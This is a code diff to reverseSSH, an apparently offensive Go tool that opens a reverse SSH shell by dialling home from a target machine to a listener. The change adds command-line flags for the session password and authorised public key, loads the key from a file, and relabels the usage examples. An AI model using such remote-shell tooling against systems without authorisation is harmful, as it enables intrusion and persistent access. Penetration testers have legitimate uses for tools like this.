@@ -46,6 +46,8 @@ type params struct {
 	shell        string
 	noShell      bool
 	verbose      bool
+	localPassword        string
+	authorizedKey        string
 }
 
 func createLocalPortForwardingCallback(forbidden bool) ssh.LocalPortForwardingCallback {
@@ -127,7 +129,7 @@ func createSFTPHandler() ssh.SubsystemHandler {
 	}
 }
 
-func dialHomeAndListen(username string, address string, homeBindPort uint, askForPassword bool) (net.Listener, error) {
+func dialHomeAndListen(username string, localPassword string, address string, homeBindPort uint, askForPassword bool) (net.Listener, error) {
 	var (
 		err    error
 		client *gossh.Client
@@ -236,14 +238,14 @@ func setupParameters(noCLI string) *params {
 Usage: %[1]s [options] [[<user>@]<target>]
 
 Examples:
-  Bind:
+  Listen:
 	%[1]s -l
 	%[1]s -v -l -p 4444
-  Reverse:
+  Connect:
 	%[1]s 192.168.0.1
 	%[1]s kali@192.168.0.1
 	%[1]s -p 31337 192.168.0.1
-	%[1]s -v -b 0 kali@192.168.0.2
+	%[1]s -v -b 1234 kali@192.168.0.2
 
 Options:
 	-l, Start reverseSSH in listening mode (overrides reverse scenario)
@@ -255,16 +257,13 @@ Options:
 		enhance pre-Windows10 shells (e.g. '-s ssh-shellhost.exe' if in same directory)
 	-N, Deny all incoming shell/exec/subsystem and local port forwarding requests
 		(if only remote port forwarding is needed, e.g. when catching reverse connections)
+	-P, Password for the ssh session (default: %[3]s)
+	-k, PubKey, as string or filename (default: %[4]s)
 	-v, Emit log output
 
 <target>
 	Optional target which enables the reverse scenario. Can be prepended with
 	<user>@ to authenticate as a different user other than '%[8]s' while dialling home
-
-Credentials:
-	Accepting all incoming connections from any user with either of the following:
-	 * Password "%[3]s"
-	 * PubKey   "%[4]s"
 `, path.Base(os.Args[0]), version, localPassword, authorizedKey, defaultShell, LPORT, BPORT, LUSER)
 
 	flag.Usage = func() {
@@ -288,10 +287,20 @@ Credentials:
 	flag.StringVar(&p.shell, "s", defaultShell, "")
 	flag.BoolVar(&p.noShell, "N", false, "")
 	flag.BoolVar(&p.verbose, "v", false, "")
+	flag.StringVar(&p.localPassword, "P", localPassword, "")
+	flag.StringVar(&p.authorizedKey, "k", authorizedKey, "")
 	flag.Parse()
 
 	if !p.verbose {
 		log.SetOutput(ioutil.Discard)
+	}
+
+	if _, err := os.Stat(p.authorizedKey); err == nil {
+		temp_key, err := os.ReadFile(p.authorizedKey)
+		if err != nil {
+			log.Fatal(err)
+		}
+		p.authorizedKey = strings.TrimSpace(string(temp_key))
 	}
 
 	switch len(flag.Args()) {
@@ -340,6 +349,8 @@ func setupParametersWithoutCLI() *params {
 		shell:        defaultShell,
 		noShell:      false,
 		verbose:      false,
+		localPassword:	localPassword,
+		authorizedKey:	authorizedKey,
 	}
 }
 
@@ -358,7 +369,7 @@ func run(p *params, server ssh.Server) {
 	} else {
 		target := net.JoinHostPort(p.LHOST, fmt.Sprintf("%d", p.LPORT))
 		log.Printf("Dialling home via ssh to %s", target)
-		ln, err = dialHomeAndListen(p.LUSER, target, p.homeBindPort, p.verbose)
+		ln, err = dialHomeAndListen(p.LUSER, p.localPassword, target, p.homeBindPort, p.verbose)
 	}
 
 	if err != nil {
